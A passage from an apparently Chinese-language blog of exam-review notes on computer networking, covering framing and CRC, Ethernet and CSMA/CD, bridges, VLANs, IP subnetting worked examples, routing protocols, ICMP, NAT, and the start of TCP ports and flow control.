alt></p><ul><li>这可以去类比C语言的类似情况,这让我们想到了C语言的<code>转义符号\</code>,同样,我们也可以在<code>数据帧</code>这块引入我们的<code>转义符号</code>,这种方法叫做<code>字节填充法</code>或<code>字符填充法</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219115926.png" alt></p><ul><li>这样我们得到的帧就是这种形式了:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219120141.png" alt></p><ul><li>那么接收端该如何处理这多出来的转义符号呢？</li></ul><blockquote><p>接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。<br>而且如果转义字符也出现数据当中，那么应在转义字符前面插入一个转义字符。当接收端收到连续的两个转义字符时，就删除其中前面的一个。</p></blockquote><h3 id="差错检测-校验"><a href="#差错检测-校验" class="headerlink" title="差错检测(校验)"></a>差错检测(校验)</h3><ul><li>在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1。</li></ul><blockquote><p>在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率 BER (Bit Error Rate)。</p></blockquote><ul><li><p>在数据链路层传送的帧中，广泛使用了<code>循环冗余检验 CRC</code>的检错技术。</p></li><li><p>下面的问题中会具体介绍这个检错方法。</p></li></ul><h2 id="Q4-CRC校验计算方法及它与多项式的对应关系"><a href="#Q4-CRC校验计算方法及它与多项式的对应关系" class="headerlink" title="Q4 CRC校验计算方法及它与多项式的对应关系"></a>Q4 CRC校验计算方法及它与多项式的对应关系</h2><ul><li>这个有点难写, 具体可以看下面一篇博客, 写的还算比较通俗易懂的, 但愿这个考点考不到。</li></ul><p><a href="https://blog.csdn.net/u011854789/article/details/80206676" target="_blank" rel="noopener">传送门</a></p><ul><li>ps:补充一点: <code>模2除法</code>可以看作<code>异或运算</code>。</li></ul><h2 id="Q5-以太网的工作原理和方法"><a href="#Q5-以太网的工作原理和方法" class="headerlink" title="Q5 以太网的工作原理和方法"></a>Q5 以太网的工作原理和方法</h2><ul><li><p>以太网采用<code>CSMA/CD协议</code>,能够实现<code>载波侦听,冲突检测,多点随机接入,二进制退避</code>。</p></li><li><p><code>载波监听</code>是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。</p></li><li><p><code>冲突检测</code>：</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219142140.png" alt></p><ul><li><p><code>多点随机接入</code>表示许多计算机以多点接入的方式连接在一根总线上。</p></li><li><p><code>二进制退避</code>: 发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。</p></li></ul><h2 id="Q6-网卡的功能"><a href="#Q6-网卡的功能" class="headerlink" title="Q6 网卡的功能"></a>Q6 网卡的功能</h2><ul><li><p><code>数据的封装与解封</code>。发送时将上一层交下来的数据加上首部和尾部，成为以太网的帧。接收时将以太网的帧剥去首部和尾部，然后送交上一层。</p></li><li><p><code>链路管理</code>。主要是CSMA/CD协议的实现。</p></li><li><p><code>编码与译码</code>。即曼彻斯特编码与译码。</p></li></ul><h2 id="Q7-数据链路层信道的使用方法"><a href="#Q7-数据链路层信道的使用方法" class="headerlink" title="Q7 数据链路层信道的使用方法"></a>Q7 数据链路层信道的使用方法</h2><ul><li><p>数据链路层有两种信道:</p></li><li><p>第一种是<code>点对点信道</code>,实现协议是<code>PPP协议</code></p></li><li><p>第二种是<code>广播信道</code>,实现协议是<code>CSMA/CD协议</code>，ps:使用<code>CDMA/CD协议</code>的以太网只能进行半双工通信。</p></li></ul><h2 id="Q8-本章缩写"><a href="#Q8-本章缩写" class="headerlink" title="Q8 本章缩写"></a>Q8 本章缩写</h2><ul><li><p><code>CRC</code>: 循环冗余校验（Cyclic Redundancy Check， CRC）</p></li><li><p><code>CSMA/CD</code>：载波侦听多路访问/冲突检测(Carrier Sense Multiple Access with Collision Detection)</p></li><li><p><code>PPP</code>: 点对点协议（Point to Point Protocol，PPP）</p></li><li><p><code>MAC地址</code>: Media Access Control Address，媒体存取控制位址</p></li><li><p><code>FCS</code>: Frame Check Sequences，帧校验序列</p></li><li><p><code>LLC</code>: Logical Link Control，逻辑链路控制</p></li><li><p><code>VLAN</code>: Virtual Local Area Network，虚拟局域网</p></li></ul><h2 id="Q9-各层如何拓展网络"><a href="#Q9-各层如何拓展网络" class="headerlink" title="Q9 各层如何拓展网络"></a>Q9 各层如何拓展网络</h2><ul><li><p>物理层采用<code>集线器</code>、<code>Hub</code>来拓展网络</p></li><li><p>数据链路层采用<code>网桥</code>、<code>交换机</code>来拓展网络</p></li><li><p>网络层采用<code>路由器</code>来拓展网络。</p></li><li><p>其中<code>交换机、网桥</code>可以隔绝碰撞域。</p></li><li><p><code>路由器</code>可以隔绝广播域。</p></li></ul><h2 id="Q10-网桥和交换机的工作原理-重点！"><a href="#Q10-网桥和交换机的工作原理-重点！" class="headerlink" title="Q10 网桥和交换机的工作原理 (重点！)"></a>Q10 网桥和交换机的工作原理 (重点！)</h2><h3 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h3><ul><li>网桥根据 MAC 帧的目的地址对收到的帧进行转发。</li><li>网桥具有过滤帧的功能。当网桥收到一个帧时，并不是向所有的接口转发此帧，而是先检查此帧的目的 MAC 地址，然后再确定将该帧转发到哪一个接口。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219145100.png" alt></p><blockquote><p>网桥的优点: 过滤通信量、扩大了物理范围、提高了可靠性、可互连不同物理层、不同 MAC 子层和不同速率（如10 Mb/s 和 100 Mb/s 以太网）的局域网。</p></blockquote><blockquote><p>网桥的缺点:存储转发增加了时延、在MAC 子层并没有流量控制功能、网桥只适合于用户数不太多和通信量不太大的局域网。</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219145449.png" alt></p><ul><li>网桥的功能可以归结为<code>学习、转发</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219150729.png" alt></p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><ul><li>理解了网桥以后,交换机就简单了, 交换机就可以当做<code>多接口的网桥</code>。</li></ul><blockquote><p>交换机通常都有十几个接口。因此，以太网交换机实质上就是一个多接口的网桥，可见交换机工作在数据链路层。</p></blockquote><h2 id="Q11-VLAN的功能及实现方法"><a href="#Q11-VLAN的功能及实现方法" class="headerlink" title="Q11 VLAN的功能及实现方法"></a>Q11 VLAN的功能及实现方法</h2><ul><li>VLAN的功能:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219151816.png" alt></p><ol><li><p><code>限制广播域</code>：广播域被限制在一个VLAN内，节省了带宽，提高了网络处理能力。</p></li><li><p><code>增强局域网的安全性</code>：不同VLAN内的报文在传输时是相互隔离的，即一个VLAN内的用户不能和其它VLAN内的用户直接通信。</p></li><li><p><code>提高网络的健壮性</code>：故障被限制在一个VLAN内，本VLAN内的故障不会影响其他VLAN的正常工作。</p></li><li><p><code>灵活构建虚拟工作组</code>：用VLAN可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。</p></li></ol><ul><li>VLAN的实现方式有:<code>基于端口划分</code>、<code>基于MAC地址划分</code>、<code>基于IP划分</code>、<code>基于策略划分</code>。</li></ul><h2 id="Q12-个人补充"><a href="#Q12-个人补充" class="headerlink" title="Q12 个人补充"></a>Q12 个人补充</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191219152117.png" alt></p><ul><li>记住一个特殊的数字<code>1518</code></li></ul><h1 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h1><h2 id="Q1-网络层的功能和协议"><a href="#Q1-网络层的功能和协议" class="headerlink" title="Q1 网络层的功能和协议"></a>Q1 网络层的功能和协议</h2><ul><li>网络层的功能: 网络层主要解决数据包从起点到终点的传输问题。</li><li>与网络层相关的协议: <code>地址解析协议 ARP</code>、<code>逆地址解析协议 RARP</code>、<code>内部网关协议 RIP</code>、<code>内部网关协议 OSPF</code>、<code>外部网管协议 BGP</code>等…</li></ul><h2 id="Q2-IP和MAC的关系？-为什么既要有MAC有需要有IP"><a href="#Q2-IP和MAC的关系？-为什么既要有MAC有需要有IP" class="headerlink" title="Q2 IP和MAC的关系？(为什么既要有MAC有需要有IP)"></a>Q2 IP和MAC的关系？(为什么既要有MAC有需要有IP)</h2><ul><li><p>首先来简单介绍一下MAC地址和IP地址。</p></li><li><p><code>MAC地址是绝对的</code></p><blockquote><p>MAC地址又称为物理地址，每一台主机有一个固定的MAC地址，可以理解成这台主机出厂就具备了该物理地址，就好比人的身份证号，每个人都有自己唯一的身份证号。</p></blockquote></li><li><p><code>IP地址是相对的</code></p></li></ul><blockquote><p>IP地址并不是主机唯一的，我们知道IP地址有共有IP地址和私有IP地址之分（如下图所示）。其中公有地址是由统一管理分配的，例如我们搭建了一个网站，希望能被所有地方的人访问到，则需要去购买一个公有的IP地址；私有IP地址则是在局域网内部，比如教研室、宿舍、办公室等大家的IP地址（可通过接入设备，以一个共同的公网IP而连接外网），例如常用的192.168.0.1、192.168.0.2等。</p></blockquote><ul><li>所以问题的答案就是: <code>IP地址决定了网络中数据包如何通过路由器的转发到达目的地，而MAC地址则唯一标识了接受这个数据包的主机。</code>ps:可以把IP地址当做快递地址, MAC是收件人。</li></ul><h2 id="Q3-网络层的服务-下面的对比表是重点"><a href="#Q3-网络层的服务-下面的对比表是重点" class="headerlink" title="Q3 网络层的服务(下面的对比表是重点)"></a>Q3 网络层的服务(下面的对比表是重点)</h2><ul><li><p>网络层向运输层提供的服务主要有两种: 第一种是<code>面向连接</code>，另一种是<code>无连接</code>。它们还有另外的叫法: <code>可靠服务</code>和<code>不可靠服务</code>。</p></li><li><p>这里以<code>虚电路服务</code>和<code>数据报服务</code>以及<code>TCP/IP</code>和<code>UDP</code>为例。</p></li><li><p><code>虚电路服务</code>和<code>TCP/IP</code>是<code>可靠服务</code>,是<code>面向连接</code>的。</p></li><li><p><code>数据报服务</code>和<code>UDP</code>是<code>不可靠服务</code>,是<code>无连接</code>的。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220202348.png" alt></p><h2 id="Q4-本章缩写"><a href="#Q4-本章缩写" class="headerlink" title="Q4 本章缩写"></a>Q4 本章缩写</h2><ul><li><p><code>ARP</code>:（Address Resolution Protocol，地址解析协议）是根据IP地址获取物理地址的一个TCP/IP协议。</p></li><li><p><code>RARP</code>: （Reverse Address Resolution Protocol，逆地址解析协议）,该协议允许局域网的物理机器从网关服务器的 ARP 表或者缓存上请求其 IP 地址。</p></li><li><p><code>ICMP</code>:（Internet Control Message Protocol，Internet控制报文协议。）</p></li><li><p><code>RIP</code>:(Routing Information Protocol,路由信息协议）是一种内部网关协议,是一种动态路由选择协议。</p></li><li><p><code>OSPF</code>: （Open Shortest Path First，开放最短路径优先），该协议是用于网际协议网络的链路状态路由协议。</p></li><li><p><code>CIDR</code>: （Classless Inter-Domain Routing，无类别域间路由）该协议是一个用于给用户分配IP地址以及在互联网上有效地路由IP数据包的对IP地址进行归类的方法。</p></li><li><p><code>VLSM</code>: （Variable Length Subnet Mask，可变长子网掩码）该协议的目的是最有效地利用现有的地址空间。</p></li><li><p><code>VPN</code>: （Virtual Private Network，虚拟专用网络）</p></li><li><p><code>NVT</code>: （network virtual terminal，网络虚拟终端）</p></li></ul><h2 id="Q5-为何构建虚拟互联网"><a href="#Q5-为何构建虚拟互联网" class="headerlink" title="Q5 为何构建虚拟互联网"></a>Q5 为何构建虚拟互联网</h2><ul><li>使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。</li></ul><h2 id="Q6-和IP地址相关的一些知识"><a href="#Q6-和IP地址相关的一些知识" class="headerlink" title="Q6 和IP地址相关的一些知识"></a>Q6 和IP地址相关的一些知识</h2><h3 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220211831.png" alt></p><ul><li><p><code>A&lt;128&lt;=B&lt;192&lt;=C</code></p></li><li><p>其中ABC类IP为单播地址。</p></li></ul><h3 id="支持子网掩码的IP"><a href="#支持子网掩码的IP" class="headerlink" title="支持子网掩码的IP"></a>支持子网掩码的IP</h3><ul><li>由<code>分类的IP地址</code>变到<code>支持子网掩码的IP地址</code>解决了IP资源不够的问题。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220224851.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220225036.png" alt></p><h3 id="无分类的IP-CIDR"><a href="#无分类的IP-CIDR" class="headerlink" title="无分类的IP (CIDR)"></a>无分类的IP (CIDR)</h3><ul><li><p>由<code>支持子网掩码的IP</code>变成<code>无分类的IP</code>解决了路由表内容暴增的问题。</p></li><li><p><code>无分类的IP</code>利用了网络聚合技术。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220230058.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220230526.png" alt></p><ul><li><p>举例1:</p></li><li><p>128.14.32.0/20 表示的地址块共有 2^12 个地址（因为斜线后面的 20 是网络前缀的位数，而IP总位数为32，所以这个地址的主机号是 32-20=12 位）。</p></li><li><p>举例2:</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220230752.png" alt></p><h2 id="Q7-IP地址如何由路由器进行转发"><a href="#Q7-IP地址如何由路由器进行转发" class="headerlink" title="Q7 IP地址如何由路由器进行转发"></a>Q7 IP地址如何由路由器进行转发</h2><h3 id="对于分类的IP地址"><a href="#对于分类的IP地址" class="headerlink" title="对于分类的IP地址"></a>对于分类的IP地址</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220222030.png" alt></p><ul><li>例题:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220222509.png" alt></p><h3 id="对于划分子网的IP地址"><a href="#对于划分子网的IP地址" class="headerlink" title="对于划分子网的IP地址"></a>对于划分子网的IP地址</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220222147.png" alt></p><ul><li>例题:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220225646.png" alt></p><h2 id="Q8-ARP协议的工作原理"><a href="#Q8-ARP协议的工作原理" class="headerlink" title="Q8 ARP协议的工作原理"></a>Q8 ARP协议的工作原理</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220213528.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220213550.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220213908.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220214001.png" alt></p><h2 id="Q9-IP数据报首部20个字节里的内容及含义-重点"><a href="#Q9-IP数据报首部20个字节里的内容及含义-重点" class="headerlink" title="Q9 IP数据报首部20个字节里的内容及含义 (重点)"></a>Q9 IP数据报首部20个字节里的内容及含义 (重点)</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220214402.png" alt></p><ul><li><p>其中我们的<code>固定部分</code>就是首部的20字节,每行32位,占4字节,共5行,总计20字节。</p></li><li><p>我们的<code>可变部分</code>最大40字节。</p></li><li><p><code>版本</code>——占 4 位，指 IP 协议的版本。目前的 IP 协议版本号为 4 (即 IPv4)</p></li><li><p><code>首部长度</code>——占 4 位，可表示的最大数值，是 15 个单位(一个单位为 4 字节)，因此 IP 的首部长度的最大值是 60 字节。</p></li><li><p><code>区分服务</code>——占 8 位，用来获得更好的服务，在旧标准中叫做服务类型，但实际上一直未被使用过。1998 年这个字段改名为区分服务。只有在使用区分服务（DiffServ）时，这个字段才起作用。在一般的情况下都不使用这个字段 。</p></li><li><p><code>总长度</code>——占 16 位，指首部和数据之和的长度，单位为字节，因此数据报的最大长度为 65535 字节。总长度必须不超过最大传送单元 MTU。</p></li><li><p><code>标识</code>——占 16 位，它是一个计数器，用来产生数据报的标识。</p></li><li><p><code>标志</code>——占 3 位，目前只有前两位有意义。标志字段的最低位是 <code>MF (More Fragment)</code>。<code>MF = 1</code> 表示后面<code>“还有分片”</code>。<code>MF = 0</code> 表示<code>最后一个分片</code>。标志字段中间的一位是<code>DF (Don&#39;t Fragment)</code>。只有当<code>DF = 0</code> 时才<code>允许分片</code>。 ps: 分片接下来会介绍。</p></li><li><p><code>片偏移(12 位)</code>指出：较长的分组在分片后，某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。</p></li><li><p><code>生存时间(8 位)</code>记为 TTL (Time To Live)数据报在网络中可通过的路由器数的最大值。</p></li><li><p><code>协议(8 位)</code>字段指出此数据报携带的数据使用何种协议以便目的主机的 IP 层将数据部分上交给哪个处理过程</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220221027.png" alt></p><ul><li><p><code>首部检验和(16 位)</code>字段只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。</p></li><li><p><code>源地址</code>和<code>目的地址</code>都各占 4 字节</p></li></ul><h3 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h3><ul><li>在<code>标志和片偏移</code>中我们谈到一个新词<code>分片</code>,下面介绍一下<code>分片</code>:</li></ul><blockquote><p>把一个数据报为了适合网络传输而分成多个数据报的过程称为分片，被分片后的各个IP数据报可能经过不同的路径到达目标主机。<br>一个IP数据报在传输过程中可能被分片，也可能不被分片。如果被分片，分片后的IP数据报和原来没有分片的IP数据报结构是相同的，即也是由IP头部和IP数据区两个部分组成：</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220220419.png" alt></p><blockquote><p>分片后的IP数据报，数据区是原IP数据报数据区的一个连续部分，头部是原IP数据报头部的复制，但与原来未分片的IP数据报头部有两点主要不同：标志和片偏移：</p></blockquote><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220220532.png" alt></p><ul><li>下面举个例子:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220220716.png" alt></p><h2 id="Q10-路由器的两大功能"><a href="#Q10-路由器的两大功能" class="headerlink" title="Q10 路由器的两大功能"></a>Q10 路由器的两大功能</h2><ul><li><code>路由</code>和<code>转发</code></li></ul><h2 id="Q11-RIP和OSPF-如何工作"><a href="#Q11-RIP和OSPF-如何工作" class="headerlink" title="Q11 RIP和OSPF 如何工作"></a>Q11 RIP和OSPF 如何工作</h2><h3 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议"></a>RIP协议</h3><ul><li><p><code>RIP协议</code>让互联网中的所有路由器都和自己的相邻路由器不断交换路由信息，并不断更新其路由表，使得从每一个路由器到每一个目的网络的路由都是最短的（即跳数最少）。</p></li><li><p>ps: <code>RIP协议</code>基于<code>距离向量算法</code>，<code>好消息传得快，坏消息传得慢</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221172616.png" alt></p><h3 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221173105.png" alt></p><ul><li>所以<code>OSPF协议</code>的工作原理可以概述为: 先通过<code>问候</code>确定数据报的可达性,然后通过与相邻路由器进行<code>数据库描述</code>达到<code>数据库的同步</code>,最后进行<code>链路状态请求</code>、<code>链路状态更新</code>、<code>链路状态确认</code>达到<code>新情况下的同步</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221173144.png" alt></p><h2 id="Q12-分配IP的方法-重点"><a href="#Q12-分配IP的方法-重点" class="headerlink" title="Q12 分配IP的方法 (重点)"></a>Q12 分配IP的方法 (重点)</h2><ul><li><p>可分配的IP地址数等于 <code>2^n</code>,其中n是主机号的位数(二进制位数)。假设主机号占5位,则可分配的IP地址数为2^5 = 32</p></li><li><p><code>可用的IP地址 = 可分配的IP地址数 - 2</code>,需要减去<code>全0的网络号</code>和<code>全1的广播地址</code>。</p></li></ul><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><ul><li><p>问: 已知<code>200.20.20.0/24</code>，且已知部门1需要121个IP地址, 部门2需要60个IP地址, 部门3需要 30个IP地址 部门4需要10个IP地址, 怎么分配比较合理？</p></li><li><p>为了方便分配,我们对每个部门都分配<code>2的m次方</code>个IP地址,需要满足<code>2的m次方刚好大于等于我们需要的IP地址数</code>。</p></li><li><p>所以 部门1分配128个，部门2分配64个，部门3分配32个，部门4分配16个。</p></li><li><p>我们把<code>这段IP（叫法估计不太准确）</code>转换成二进制的形式可以得到:</p></li><li><p><code>11001000.00010100.00010100.00000000</code>。IP地址一共32位,这道题其中<code>前24位</code>为网络前缀,<code>后面8位</code>为主机号。部门1分配到128个,128写成二进制就是<code>10000000</code>。由于后面的8位主机号能构成2个128, 我们取其中一个, 所以<code>第25位数</code>写0(默认优先写0)。然后后面的32-25=7位就可以任意组合了,一共128种组合,也就代表了128个IP地址。这样我们得到了部门1分得的IP段<code>11001000.00010100.00010100.0/25</code>。</p></li><li><p>接下来给部门2分配IP段,由于我们的<code>第25位</code>在给部门1分配IP段的时候已经用过了(当时置为0了),所以在给其他部门分配的时候应该<code>置为1</code>。部门2分配64个,64写成二进制为<code>00100000</code>,仿照给部门1分配IP时的方法, 我们<code>第26位要置为0</code>,所以得到部门2的IP段为:<code>11001000.00010100.00010100.10/26</code>。</p></li><li><p>部门3和部门4同理~</p></li><li><p>所以最终得到:</p></li><li><p>部门1得到的IP段为: <code>11001000.00010100.00010100.0/25</code>，也可以记作<code>从200.20.20.0到200.20.20.127</code></p></li><li><p>部门2得到的IP段为: <code>11001000.00010100.00010100.10/26</code>，也可以记作<code>从200.20.20.128到200.20.20.191</code></p></li><li><p>部门3得到的IP段为: <code>11001000.00010100.00010100.110/27</code>，也可以记作<code>从200.20.20.192到200.20.20.223</code></p></li><li><p>部门4得到的IP段为: <code>11001000.00010100.00010100.1110/28</code>，也可以记作<code>从200.20.20.224到200.20.20.239</code></p></li></ul><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><ul><li><p>问: <code>200.20.20.0/24</code>划分成16个子网该如何划分？</p></li><li><p>16个子网也就是2^4个子网, 所以我们需要在主机号段<code>从前往后</code>借4位。</p></li><li><p>所以我们得到<code>子网掩码</code>为: <code>11111111 11111111 11111111 11110000</code></p></li><li><p>所以<code>每个子网的IP数量</code>为 <code>2^4=16</code>个 ps: 可以理解子网掩码还剩几个0就是2的几次方个。</p></li><li><p><code>第一个子网的IP范围</code>是<code>200.20.20.0</code>到<code>200.20.20.15</code>。也就是后八位<code>00000000</code>到<code>00001111</code>。</p></li><li><p><code>第二个子网的IP范围</code>是<code>200.20.20.16</code>到<code>200.20.20.31</code>。也就是后八位<code>00010000</code>到<code>00011111</code>。</p></li><li><p>ps: 这里每个IP的第四个数都可以看作两部分组合而来的,以这道题为例,由于我们借了4位(第25到第28位),这四位能得到16个子网，而后面四位主机号也能重组得到16个主机号。二者组合得到IP地址的第四个数。 就比方说<code>00011111</code>在这道题中就是代表子网的四位<code>0001</code>和代表主机号的四位<code>1111</code>组合在一起来的。</p></li><li><p>同理我们能得到第一个一直到第十六个子网各自的IP范围。</p></li><li><p>其中<code>主机号全0的网络号</code>和<code>主机号全1的广播地址</code>不能用。</p></li><li><p>所以第一个子网中最小的可用IP为:<code>200。20.20.1</code>,最大的可用IP为:<code>200.20。20.14</code>。</p></li><li><p>同理我们也能求出其他子网中最小可用IP和最大可用IP。</p></li></ul><h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><ul><li><p>问题依旧是给部门分配IP,但是这次我们知道的是 每个部门最多30台使用IP的设备。</p></li><li><p>最多30台设备,那我们每个部门分配32(2^5)个IP,这次我们在主机号段,<code>从后往前</code>取5位让它自由组合。</p></li><li><p>问法应该也就例题1和例题2里面的那几种吧…就不再重新问答一遍了…</p></li></ul><h2 id="Q13-ICMP的功能"><a href="#Q13-ICMP的功能" class="headerlink" title="Q13 ICMP的功能"></a>Q13 ICMP的功能</h2><ul><li>ICMP 报文的种类有两种，即 <code>ICMP 差错报告报文</code>和 <code>ICMP 询问报文</code>。 ps: ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去。</li></ul><ul><li><code>询问2</code>：</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220231015.png" alt></p><ul><li><code>报错5</code>:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220231057.png" alt></p><ul><li>应用举例:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191220231522.png" alt></p><h2 id="Q14-全球IP地址和私有IP地址"><a href="#Q14-全球IP地址和私有IP地址" class="headerlink" title="Q14 全球IP地址和私有IP地址"></a>Q14 全球IP地址和私有IP地址</h2><ul><li>要背私有IP地址~</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221195802.png" alt></p><h2 id="Q15-VPN和NAT如何工作"><a href="#Q15-VPN和NAT如何工作" class="headerlink" title="Q15 VPN和NAT如何工作"></a>Q15 VPN和NAT如何工作</h2><ul><li><code>VPN 虚拟专用网络（Virtual Private Network）</code>: <code>任意两个节点之间的连接并没有传统专网所需的端到端的物理链路，而是架构在公用网络服务商所提供的网络平台</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221200543.png" alt></p><ul><li><code>NAT 网络地址转换 (Network Address Translation)</code>:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221200658.png" alt></p><h1 id="第五章-运输层"><a href="#第五章-运输层" class="headerlink" title="第五章 运输层"></a>第五章 运输层</h1><h2 id="Q1-运输层的功能和协议"><a href="#Q1-运输层的功能和协议" class="headerlink" title="Q1 运输层的功能和协议"></a>Q1 运输层的功能和协议</h2><ul><li>功能: 运输层为<code>应用进程之间</code>提供<code>端到端</code>的逻辑通信。PS:但网络层是为<code>主机之间</code>提供逻辑通信。</li><li>协议: <code>TCP/IP</code>、<code>UDP</code></li></ul><h2 id="Q2-TCP-IP-和-UDP-的对比"><a href="#Q2-TCP-IP-和-UDP-的对比" class="headerlink" title="Q2 TCP/IP 和 UDP 的对比"></a>Q2 TCP/IP 和 UDP 的对比</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221205210.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221205130.png" alt></p><h2 id="Q3-端口"><a href="#Q3-端口" class="headerlink" title="Q3 端口"></a>Q3 端口</h2><ul><li><p><code>端口的作用?(为什么要引入端口?)</code>:为了使运行不同操作系统的计算机的应用进程能够互相通信，就必须用统一的方法对 TCP/IP 体系的应用进程进行标志。因此我们在运输层使用协议端口号(protocol port number)，或通常简称为端口(port)。</p></li><li><p>ps:<code>端口</code>分为<code>软件端口</code>和<code>硬件端口</code>。在<code>协议栈层间的抽象的协议端口</code>是<code>软件端口</code>。<code>路由器或交换机上的端口</code>是<code>硬件端口</code>。</p></li><li><p><code>TCP</code>的端口用一个16位的端口号进行标志。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221204536.png" alt></p><ul><li>需要记一下<code>HTTP的端口号</code>是<code>80</code>,<code>FTP的端口号</code>是<code>20和21</code>，其中20用于传输数据，21用于传输控制信息。</li></ul><h2 id="Q4-滑动窗口协议-重点"><a href="#Q4-滑动窗口协议-重点" class="headerlink" title="Q4 滑动窗口协议 (重点)"></a>Q4 滑动窗口协议 (重点)</h2><ul><li>这个博客挺不错的，可以根据这个博客学习一下滑动窗口协议。</li></ul><p><a href="https://www.cnblogs.com/blythe/articles/7348812.html" target="_blank" rel="noopener">传送门</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191221221702.png" alt></p><h2 id="Q5-TCP如何进行流量控制"><a href="#Q5-TCP如何进行流量控制" class="headerlink" title="Q5 TCP如何进行流量控制"></a>Q5 TCP如何进行流量控制</h2><ul><li><p>利用<code>滑动窗口机制</code>可以很方便地在 TCP 连接上实现流量控制。</p></li><li><p>原理这就是运用TCP报文段中的<code>窗口大小字段</code>(在问题Q7中会有详细说明)来控制，发送方的发送窗口不可以大于接收方发回的窗口大小。</p></li></ul><blockquote><p>考虑一种特殊的情况，就是接收方若没有缓存足够使用，就会发送零窗口大小的报文，此时发送放将发送窗口设置为0，停止发送数据。之后接收方有足够的缓存，发送了非零窗口大小的报文，但是如果这个报文在中途丢失的，那么发送方的发送窗口就一直为零导致死锁。<br>为解决这个问题，TCP为每一个连接设置一个持续计时器（persistence 